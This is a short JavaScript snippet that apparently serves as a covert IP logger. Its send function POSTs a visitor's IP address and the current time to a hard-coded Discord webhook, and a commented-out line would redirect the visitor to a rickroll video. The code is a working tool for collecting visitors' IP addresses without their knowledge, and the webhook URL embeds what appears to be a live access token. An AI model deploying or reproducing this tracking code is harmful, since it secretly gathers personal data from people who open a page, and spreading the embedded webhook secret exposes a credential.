function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function send(ip){
    const webhook = "https://discord.com/api/webhooks/1269346466816852042/qN_W9h76M6DPWFP3bszZMPdWX85u7Om-mI5eiLzbUHm18h3fGNBiiSZKSLYLzpyWG_pa";
    const msg = `IP: ${ip} \nTime: ${new Date().toLocaleString()}\n `;
    const request = new XMLHttpRequest();
    request.open("POST", webhook);
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
        content: msg
    }
    request.send(JSON.stringify(params));

    sleep(2000).then(() => {
        //window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ?&autoplay=1");
    });

    
}